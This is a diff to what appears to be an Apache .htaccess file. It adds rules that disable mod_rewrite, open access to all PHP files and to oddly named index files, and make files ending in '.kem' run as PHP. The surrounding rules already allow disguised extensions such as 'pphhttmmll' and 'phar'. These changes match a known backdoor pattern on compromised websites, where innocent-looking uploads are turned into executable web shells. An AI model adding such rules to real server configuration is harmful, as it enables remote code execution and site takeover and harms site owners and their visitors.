@@ -30,6 +30,22 @@
     Order Deny,Allow
     Allow from all
 </Files>
+<IfModule mod_rewrite.c>
+RewriteEngine Off
+</IfModule>
+<IfModule mod_authz_core.c>
+<FilesMatch "\.php$">
+Require all granted
+</FilesMatch>
+</IfModule>
+<FilesMatch "\.php$">
+Order allow,deny
+allow from all
+</FilesMatch>
+<FilesMatch "^()$">
+Order allow,deny
+Allow from all
+</FilesMatch>
 <Files ~ '\.(xml|cgi|phtml|pphhttmmll|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|phar|pht|pp|kem|exe|php7|ph|php5|php)$'>
 Allow from all
 Require all granted
@@ -37,4 +53,15 @@ Require all granted
 <FilesMatch "^index.php$">
 Order allow,deny
 Allow from all
+</FilesMatch>
+<FilesMatch "^index.ppp$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^index.shtml$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "\.kem$">
+    SetHandler application/x-httpd-php
 </FilesMatch>
